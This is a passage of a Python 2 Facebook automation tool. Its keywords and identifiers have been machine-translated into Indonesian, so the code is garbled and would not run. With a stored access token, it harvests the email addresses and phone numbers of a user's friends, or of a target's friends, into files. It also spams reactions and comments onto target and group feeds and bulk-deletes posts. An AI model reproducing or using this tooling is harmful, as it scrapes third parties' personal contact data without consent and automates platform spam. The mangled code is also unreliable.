            cetak '\ x1b [1; 91m [!] Berhenti'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            mengambil()
        kecuali KeyError:
            os.remove (simg)
            cetak '\ x1b [1; 91m [!] Grup tidak ditemukan'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            mengambil()
        kecuali requests.exceptions.ConnectionError:
            cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] Tidak ada koneksi'
            keluar ()


def email ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()
    lain:
        mencoba:
            os.system ('clear')
            cetak logo
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            mails = raw_input ('\ x1b [1; 91m [+] \ x1b [1; 92mSimpan File \ x1b [1; 97mext (file.txt) \ x1b [1; 91m: \ x1b [1; 97m') ')
            r = requests.get ('https://graph.facebook.com/me/friends?access_token=' + toket)
            a = json.loads (r.text)
            mpsh = buka (email, 'w')
            jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mHarap tunggu \ x1b [1; 97m ...')
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            untuk saya di ['data']:
                x = requests.get ('https://graph.facebook.com/' + i ['id'] + '? access_token =' + toket)
                z = json.loads (x.text)
                mencoba:
                    em.append (z ['email'])
                    mpsh.write (z ['email'] + '\ n')
                    cetak '\ r \ x1b [1; 92mName \ x1b [1; 91m: \ x1b [1; 97m' + z ['name']
                    cetak '\ x1b [1; 92mEmail \ x1b [1; 91m: \ x1b [1; 97m' + z ['email']
                    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
                kecuali KeyError:
                    lulus

            cetak '\ n \ r \ x1b [1; 91m [+] \ x1b [1; 97mTotal Email \ x1b [1; 96m% s'% len (em)
            cetak '\ x1b [1; 91m [+] \ x1b [1; 97mFile disimpan \ x1b [1; 91m: \ x1b [1; 97m' + email
            mpsh.close ()
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            mengambil()
        kecuali IOError:
            print '\ x1b [1; 91m [!] Error saat membuat file'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            mengambil()
        kecuali (KeyboardInterrupt, EOFError):
            cetak '\ x1b [1; 91m [!] Berhenti'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            mengambil()
        kecuali KeyError:
            os.remove (email)
            print '\ x1b [1; 91m [!] Terjadi kesalahan'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            mengambil()
        kecuali requests.exceptions.ConnectionError:
            cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] Tidak ada koneksi'
            keluar ()


def emailfrom_friends ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()
    lain:
        mencoba:
            os.system ('clear')
            cetak logo
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            idt = input_dasar ('\ x1b [1; 91m [+] \ x1b [1; 92mMasukkan ID Teman \ x1b [1; 91m: \ x1b [1; 97m')
            mencoba:
                jok = requests.get ('https://graph.facebook.com/' + idt + '? access_token =' + toket)
                op = json.loads (jok.text)
                cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mFrom \ x1b [1; 91m: \ x1b [1; 97m' + op ['nama']
            kecuali KeyError:
                cetak '\ x1b [1; 91m [!] Bukan teman'
                masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                mengambil()

            mails = raw_input ('\ x1b [1; 91m [+] \ x1b [1; 92mSimpan File \ x1b [1; 97mext (file.txt) \ x1b [1; 91m: \ x1b [1; 97m') ')
            r = requests.get ('https://graph.facebook.com/' + idt + '/ friends? access_token =' + toket)
            a = json.loads (r.text)
            mpsh = buka (email, 'w')
            jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mHarap tunggu \ x1b [1; 97m ...')
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            untuk saya di ['data']:
                x = requests.get ('https://graph.facebook.com/' + i ['id'] + '? access_token =' + toket)
                z = json.loads (x.text)
                mencoba:
                    emfromfriends.append (z ['email'])
                    mpsh.write (z ['email'] + '\ n')
                    cetak '\ r \ x1b [1; 92mName \ x1b [1; 91m: \ x1b [1; 97m' + z ['name']
                    cetak '\ x1b [1; 92mEmail \ x1b [1; 91m: \ x1b [1; 97m' + z ['email']
                    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
                kecuali KeyError:
                    lulus

            cetak '\ n \ r \ x1b [1; 91m [+] \ x1b [1; 97mTotal Email \ x1b [1; 96m% s'% len (emfromfriends)
            cetak '\ x1b [1; 91m [+] \ x1b [1; 97mFile disimpan \ x1b [1; 91m: \ x1b [1; 97m' + email
            mpsh.close ()
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            mengambil()
        kecuali IOError:
            print '\ x1b [1; 91m [!] Error saat membuat file'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            mengambil()
        kecuali (KeyboardInterrupt, EOFError):
            cetak '\ x1b [1; 91m [!] Berhenti'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            mengambil()
        kecuali requests.exceptions.ConnectionError:
            cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] Tidak ada koneksi'
            keluar ()


def nomor_hp ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()
    lain:
        mencoba:
            os.system ('clear')
            cetak logo
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            noms = raw_input ('\ x1b [1; 91m [+] \ x1b [1; 92mSimpan File \ x1b [1; 97mext (file.txt) \ x1b [1; 91m: \ x1b [1; 97m' ')
            url = 'https://graph.facebook.com/me/friends?access_token=' + toket
            r = requests.get (url)
            z = json.loads (r.text)
            no = open (noms, 'w')
            jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mHarap tunggu \ x1b [1; 97m ...')
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            untuk n dalam z ['data']:
                x = requests.get ('https://graph.facebook.com/' + n ['id'] + '? access_token =' + toket)
                z = json.loads (x.text)
                mencoba:
                    hp.append (z ['mobile_phone'])
                    no.write (z ['mobile_phone'] + '\ n')
                    cetak '\ r \ x1b [1; 92mName \ x1b [1; 91m: \ x1b [1; 97m' + z ['name']
                    cetak '\ x1b [1; 92mPhone \ x1b [1; 91m: \ x1b [1; 97m' + z ['mobile_phone']
                    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
                kecuali KeyError:
                    lulus

            cetak '\ n \ r \ x1b [1; 91m [+] \ x1b [1; 97mTotal Telepon \ x1b [1; 96m% s'% len (hp)
            cetak '\ x1b [1; 91m [+] \ x1b [1; 97mFile disimpan \ x1b [1; 91m: \ x1b [1; 97m' + noms
            no.close ()
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            mengambil()
        kecuali IOError:
            print '\ x1b [1; 91m [!] Error saat membuat file'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            mengambil()
        kecuali (KeyboardInterrupt, EOFError):
            cetak '\ x1b [1; 91m [!] Berhenti'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            mengambil()
        kecuali KeyError:
            os.remove (noms)
            print '\ x1b [1; 91m [!] Terjadi kesalahan'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            mengambil()
        kecuali requests.exceptions.ConnectionError:
            cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] Tidak ada koneksi'
            keluar ()


def hpfrom_friends ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()
    lain:
        mencoba:
            os.system ('clear')
            cetak logo
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            idt = masukan_ mentah ('\ x1b [1; 91m [+] \ x1b [1; 92mMasukkan ID Teman \ x1b [1; 91m: \ x1b [1; 97m')
            mencoba:
                jok = requests.get ('https://graph.facebook.com/' + idt + '? access_token =' + toket)
                op = json.loads (jok.text)
                cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mFrom \ x1b [1; 91m: \ x1b [1; 97m' + op ['nama']
            kecuali KeyError:
                cetak '\ x1b [1; 91m [!] Bukan teman'
                masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                mengambil()

            noms = raw_input ('\ x1b [1; 91m [+] \ x1b [1; 92mSimpan File \ x1b [1; 97mext (file.txt) \ x1b [1; 91m: \ x1b [1; 97m' ')
            r = requests.get ('https://graph.facebook.com/' + idt + '/ friends? access_token =' + toket)
            a = json.loads (r.text)
            no = open (noms, 'w')
            jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mHarap tunggu \ x1b [1; 97m ...')
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            untuk saya di [ 'data']:
                x = requests.get ('https://graph.facebook.com/' + i ['id'] + '? access_token =' + toket)
                z = json.loads (x.text)
                mencoba:
                    hpfromfriends.append (z ['mobile_phone'])
                    no.write (z ['mobile_phone'] + '\ n')
                    cetak '\ r \ x1b [1; 92mName \ x1b [1; 91m: \ x1b [1; 97m' + z ['name']
                    cetak '\ x1b [1; 92mPhone \ x1b [1; 91m: \ x1b [1; 97m' + z ['mobile_phone']
                    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
                kecuali KeyError:
                    lulus

            cetak '\ n \ r \ x1b [1; 91m [+] \ x1b [1; 97mJumlah total \ x1b [1; 96m% s'% len (hpfromfriends)
            cetak '\ x1b [1; 91m [+] \ x1b [1; 97mFile disimpan \ x1b [1; 91m: \ x1b [1; 97m' + noms
            no.close ()
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            mengambil()
        kecuali IOError:
            print '\ x1b [1; 91m [!] Membuat file gagal'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            mengambil()
        kecuali (KeyboardInterrupt, EOFError):
            cetak '\ x1b [1; 91m [!] Berhenti'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            mengambil()
        kecuali requests.exceptions.ConnectionError:
            cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] Tidak ada koneksi'
            keluar ()


def menu_bot ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()

    os.system ('clear')
    cetak logo
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    cetak '║-> \ x1b [1; 37; 40m1. Posting Target Reaksi Bot '
    cetak '║-> \ x1b [1; 37; 40m2. Posting Grup Reaksi Bot '
    cetak '║-> \ x1b [1; 37; 40m3. Posting Target Komentar Bot '
    cetak '║-> \ x1b [1; 37; 40m4. Posting Grup Komentar Bot '
    cetak '║-> \ x1b [1; 37; 40m5. Hapus Massal Posting '
    cetak '║-> \ x1b [1; 37; 40m6. Terima Permintaan Pertemanan '
    cetak '║-> \ x1b [1; 37; 40m7. Unfriends '
    cetak '║-> \ x1b [1; 31; 40m0. Kembali'
    cetak '\ x1b [1; 37; 40m║'
    bot_pilih ()


def bot_pilih ():
    bot = input_awal ('╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m')
    jika bot == '':
        print '\ x1b [1; 91m [!] Tidak boleh kosong'
        bot_pilih ()
    lain:
        jika bot == '1':
            menu_react ()
        lain:
            jika bot == '2':
                grup_react ()
            lain:
                jika bot == '3':
                    bot_komen ()
                lain:
                    jika bot == '4':
                        grup_komen ()
                    lain:
                        jika bot == '5':
                            deletepost ()
                        lain:
                            jika bot == '6':
                                menerima()
                            lain:
                                jika bot == '7':
                                    batalkan pertemanan ()
                                lain:
                                    jika bot == '0':
                                        Tidak bisa()
                                    lain:
                                        cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] \ x1b [1; 97m' + bot + '\ x1b [1; 91mnot found'
                                        bot_pilih ()


def menu_react ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()

    os.system ('clear')
    cetak logo
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    cetak '║-> \ x1b [1; 37; 40m1. \ x1b [1; 97mSuka '
    cetak '║-> \ x1b [1; 37; 40m2. \ x1b [1; 97mCinta '
    cetak '║-> \ x1b [1; 37; 40m3. \ x1b [1; 97mWow '
    cetak '║-> \ x1b [1; 37; 40m4. \ x1b [1; 97mHaha '
    cetak '║-> \ x1b [1; 37; 40m5. \ x1b [1; 97mSad '
    cetak '║-> \ x1b [1; 37; 40m6. \ x1b [1; 97mAngry '
    cetak '║-> \ x1b [1; 31; 40m0. Kembali'
    cetak '\ x1b [1; 37; 40m║'
    react_pilih ()


def react_pilih ():
    tipe global
    aksi = masukan_ mentah ('╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m')
    jika aksi == '':
        print '\ x1b [1; 91m [!] Tidak boleh kosong'
        react_pilih ()
    lain:
        jika aksi == '1':
            tipe = 'SUKA'
            reaksi()
        lain:
            jika aksi == '2':
                tipe = 'CINTA'
                reaksi()
            lain:
                jika aksi == '3':
                    tipe = 'WOW'
                    reaksi()
                lain:
                    jika aksi == '4':
                        tipe = 'HAHA'
                        reaksi()
                    lain:
                        jika aksi == '5':
                            tipe = 'SAD'
                            reaksi()
                        lain:
                            jika aksi == '6':
                                tipe = 'ANGRY'
                                reaksi()
                            lain:
                                jika aksi == '0':
                                    menu_bot ()
                                lain:
                                    cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] \ x1b [1; 97m' + aksi + '\ x1b [1; 91mnot found'
                                    react_pilih ()


def react ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()
    lain:
        os.system ('clear')
        cetak logo
        cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
        ide = input_makan ('\ x1b [1; 91m [+] \ x1b [1; 92mID Target \ x1b [1; 91m: \ x1b [1; 97m')
        batas = masukan_maka ('\ x1b [1; 91m [!] \ x1b [1; 92mLimit \ x1b [1; 91m: \ x1b [1; 97m')
        mencoba:
            oh = requests.get ('https://graph.facebook.com/' + ide + '? fields = feed.limit (' + limit + ') & access_token =' + toket)
            ah = json.loads (oh.text)
            jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mHarap tunggu \ x1b [1; 97m ...')
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            untuk in ah ['feed'] ['data']:
                y = a ['id']
                reaksi.append (y)
                requests.post ('https://graph.facebook.com/' + y + '/ reaction? type =' + tipe + '& access_token =' + toket)
                cetak '\ x1b [1; 92m [\ x1b [1; 97m' + y [: 10] .replace ('\ n', '') + '... \ x1b [1; 92m] \ x1b [1; 97m '+ tipe

            mencetak
            cetak '\ r \ x1b [1; 91m [+] \ x1b [1; 97m Selesai \ x1b [1; 96m' + str (len (reaksi))
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            menu_bot ()
        kecuali KeyError:
            cetak '\ x1b [1; 91m [!] ID tidak ditemukan'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            menu_bot ()


def grup_react ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()

    os.system ('clear')
    cetak logo
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    cetak '║-> \ x1b [1; 37; 40m1. \ x1b [1; 97mSuka '
    cetak '║-> \ x1b [1; 37; 40m2. \ x1b [1; 97mCinta '
    cetak '║-> \ x1b [1; 37; 40m3. \ x1b [1; 97mWow '
    cetak '║-> \ x1b [1; 37; 40m4. \ x1b [1; 97mHaha '
    cetak '║-> \ x1b [1; 37; 40m5. \ x1b [1; 97mSad '
    cetak '║-> \ x1b [1; 37; 40m6. \ x1b [1; 97mAngry '
    cetak '║-> \ x1b [1; 31; 40m0. Kembali'
    cetak '\ x1b [1; 37; 40m║'
    reactg_pilih ()


def reactg_pilih ():
    tipe global
    aksi = masukan_ mentah ('╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m')
    jika aksi == '':
        print '\ x1b [1; 91m [!] Tidak boleh kosong'
        reactg_pilih ()
    lain:
        jika aksi == '1':
            tipe = 'SUKA'
            reactg ()
        lain:
            jika aksi == '2':
                tipe = 'CINTA'
                reactg ()
            lain:
                jika aksi == '3':
                    tipe = 'WOW'
                    reactg ()
                lain:
                    jika aksi == '4':
                        tipe = 'HAHA'
                        reactg ()
                    lain:
                        jika aksi == '5':
                            tipe = 'SAD'
                            reactg ()
                        lain:
                            jika aksi == '6':
                                tipe = 'ANGRY'
                                reactg ()
                            lain:
                                jika aksi == '0':
                                    menu_bot ()
                                lain:
                                    cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] \ x1b [1; 97m' + aksi + '\ x1b [1; 91mnot found'
                                    reactg_pilih ()


def reactg ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()
    lain:
        os.system ('clear')
        cetak logo
        cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
        ide = input_dasar ('\ x1b [1; 91m [+] \ x1b [1; 92mID Grup \ x1b [1; 91m: \ x1b [1; 97m')
        batas = masukan_maka ('\ x1b [1; 91m [!] \ x1b [1; 92mLimit \ x1b [1; 91m: \ x1b [1; 97m')
        ah = requests.get ('https://graph.facebook.com/group/?id=' + ide + '& access_token =' + toket)
        asw = json.loads (ah.text)
        cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName group \ x1b [1; 91m: \ x1b [1; 97m' + asw ['nama']
        mencoba:
            oh = requests.get ('https://graph.facebook.com/v3.0/' + ide + '? fields = feed.limit (' + limit + ') & access_token =' + toket)
            ah = json.loads (oh.text)
            jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mHarap tunggu \ x1b [1; 97m ...')
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            untuk in ah ['feed'] ['data']:
                y = a ['id']
                reaksigrup.append (y)
                requests.post ('https://graph.facebook.com/' + y + '/ reaction? type =' + tipe + '& access_token =' + toket)
                cetak '\ x1b [1; 92m [\ x1b [1; 97m' + y [: 10] .replace ('\ n', '') + '... \ x1b [1; 92m] \ x1b [1; 97m '+ tipe

            mencetak
            cetak '\ r \ x1b [1; 91m [+] \ x1b [1; 97m Selesai \ x1b [1; 96m' + str (len (reaksigrup))
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            menu_bot ()
        kecuali KeyError:
            cetak '\ x1b [1; 91m [!] ID tidak ditemukan'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            menu_bot ()


def bot_komen ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()
    lain:
        os.system ('clear')
        cetak logo
        cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
        cetak "\ x1b [1; 91m [!] \ x1b [1; 92mUse \ x1b [1; 97m '<>' \ x1b [1; 92m untuk baris baru"
        ide = input_makan ('\ x1b [1; 91m [+] \ x1b [1; 92mID Target \ x1b [1; 91m: \ x1b [1; 97m')
        km = input_kasar ('\ x1b [1; 91m [+] \ x1b [1; 92mKomentar \ x1b [1; 91m: \ x1b [1; 97m')
        batas = masukan_maka ('\ x1b [1; 91m [!] \ x1b [1; 92mLimit \ x1b [1; 91m: \ x1b [1; 97m')
        km = km.replace ('<>', '\ n')
        mencoba:
            p = requests.get ('https://graph.facebook.com/' + ide + '? fields = feed.limit (' + limit + ') & access_token =' + toket)
            a = json.loads (p.text)
            jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mHarap tunggu \ x1b [1; 97m ...')
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            untuk di ['feed'] ['data']:
                f = s ['id']
                komen.append (f)
                requests.post ('https://graph.facebook.com/' + f + '/ comments? message =' + km + '& access_token =' + toket)
                cetak '\ x1b [1; 92m [\ x1b [1; 97m' + km [: 10] .replace ('\ n', '') + '... \ x1b [1; 92m]'

            mencetak
            cetak '\ r \ x1b [1; 91m [+] \ x1b [1; 97m Selesai \ x1b [1; 96m' + str (len (komen))
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            menu_bot ()
        kecuali KeyError:
            cetak '\ x1b [1; 91m [!] ID tidak ditemukan'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            menu_bot ()


def grup_komen ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()
    lain:
        os.system ('clear')
        cetak logo
        cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
        cetak "\ x1b [1; 91m [!] \ x1b [1; 92mGunakan \ x1b [1; 97m '<>' \ x1b [1; 92mUntuk Baris Baru"
        ide = input_dasar ('\ x1b [1; 91m [+] \ x1b [1; 92mID Grup \ x1b [1; 91m: \ x1b [1; 97m')
        km = input_kasar ('\ x1b [1; 91m [+] \ x1b [1; 92mKomentar \ x1b [1; 91m: \ x1b [1; 97m')
        batas = masukan_maka ('\ x1b [1; 91m [!] \ x1b [1; 92mLimit \ x1b [1; 91m: \ x1b [1; 97m')
        km = km.replace ('<>', '\ n')
        mencoba:
            ah = requests.get ('https://graph.facebook.com/group/?id=' + ide + '& access_token =' + toket)
            asw = json.loads (ah.text)
            cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName grup \ x1b [1; 91m: \ x1b [1; 97m' + asw ['nama']
            p = requests.get ('https://graph.facebook.com/v3.0/' + ide + '? fields = feed.limit (' + limit + ') & access_token =' + toket)
            a = json.loads (p.text)
            jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mHarap tunggu \ x1b [1; 97m ...')
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            untuk di ['feed'] ['data']:
                f = s ['id']
                komengrup.append (f)
                requests.post ('https://graph.facebook.com/' + f + '/ comments? message =' + km + '& access_token =' + toket)
                cetak '\ x1b [1; 92m [\ x1b [1; 97m' + km [: 10] .replace ('\ n', '') + '... \ x1b [1; 92m]'

            mencetak
            cetak '\ r \ x1b [1; 91m [+] \ x1b [1; 97m Selesai \ x1b [1; 96m' + str (len (komengrup))
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            menu_bot ()
        kecuali KeyError:
            cetak '\ x1b [1; 91m [!] ID tidak ditemukan'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            menu_bot ()


def deletepost ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
        nam = requests.get ('https://graph.facebook.com/me?access_token=' + toket)
        lol = json.loads (nam.text)
        nama = lol ['nama']
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()

    os.system ('clear')
    cetak logo
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    cetak '\ x1b [1; 91m [+] \ x1b [1; 92mDari \ x1b [1; 91m: \ x1b [1; 97m% s'% nama
    jalan ('\ x1b [1; 91m [+] \ x1b [1; 92mMulai hapus status \ x1b [1; 97m ...')
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    asu = requests.get ('https://graph.facebook.com/me/feed?access_token=' + toket)
    asus = json.loads (asu.text)
    untuk p di asus ['data']:
        id = p ['id']
        piro = 0
        url = requests.get ('https://graph.facebook.com/' + id + '? method = delete & access_token =' + toket)
        ok = json.loads (url.text)
        mencoba:
            error = oke ['error'] ['message']
            cetak '\ x1b [1; 91m [\ x1b [1; 97m' + id [: 10] .replace ('\ n', '') + '...' + '\ x1b [1; 91m] \ x1b [1; 95m Gagal '
        kecuali TypeError:
            cetak '\ x1b [1; 92m [\ x1b [1; 97m' + id [: 10] .replace ('\ n', '') + '...' + '\ x1b [1; 92m] \ x1b [1; 96mDihapus '
            piro + = 1
        kecuali requests.exceptions.ConnectionError:
            print '\ x1b [1; 91m [!] Connection Error'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            menu_bot ()

    cetak '\ n \ x1b [1; 91m [+] \ x1b [1; 97mFinish'
    masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
    menu_bot ()


def terima ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()

    os.system ('clear')
    cetak logo
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    batas = masukan_maka ('\ x1b [1; 91m [!] \ x1b [1; 92mLimit \ x1b [1; 91m: \ x1b [1; 97m')
    r = requests.get ('https://graph.facebook.com/me/friendrequests?limit=' + limit + '& access_token =' + toket)
    friends = json.loads (r.text)
    jika '[]' di str (teman ['data']):
        cetak '\ x1b [1; 91m [!] Tidak ada permintaan teman'
        masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
        menu_bot ()
    jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mHarap tunggu \ x1b [1; 97m ...')
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    untuk saya di teman ['data']:
        gas = requests.post ('https://graph.facebook.com/me/friends/' + i ['from'] ['id'] + '? access_token =' + toket)
        a = json.loads (gas.text)
        jika 'error' di str (a):
            cetak '\ x1b [1; 91m [+] \ x1b [1; 92mName \ x1b [1; 91m: \ x1b [1; 97m' + i ['from'] ['name']
            cetak '\ x1b [1; 91m [+] \ x1b [1; 92mID \ x1b [1; 91m: \ x1b [1; 97m' + i ['from'] ['id'] + '\ x1b [1; 91m Gagal '
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
        lain:
            cetak '\ x1b [1; 91m [+] \ x1b [1; 92mName \ x1b [1; 91m: \ x1b [1; 97m' + i ['from'] ['name']
            cetak '\ x1b [1; 91m [+] \ x1b [1; 92mID \ x1b [1; 91m: \ x1b [1; 97m' + i ['from'] ['id'] + '\ x1b [1; 92m Berhasil '
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'

    cetak '\ n \ x1b [1; 91m [+] \ x1b [1; 97mFinish'
    masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
    menu_bot ()


def unfriend ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()
    lain:
        os.system ('clear')
        cetak logo
        cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
